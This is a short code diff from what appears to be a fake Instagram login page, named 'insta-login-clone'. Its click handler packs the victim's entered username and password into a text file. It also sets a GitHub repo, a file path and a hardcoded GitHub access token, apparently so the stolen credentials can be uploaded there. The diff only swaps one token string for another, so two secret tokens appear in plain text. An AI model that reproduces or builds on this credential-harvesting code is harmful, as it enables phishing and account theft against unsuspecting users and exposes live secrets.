@@ -10,7 +10,7 @@ document.querySelector('.loginButton').addEventListener('click', () => {
         const owner = 'Arnav-lunatic'
         const repo = 'insta-login-clone'
         const path = 'info.txt'
-        const token = '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'
+        const token = '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'
 
         let blob = new Blob([`username - "${username.value}" | password - "${password.value}"`],
                 { type: "text/plain" });
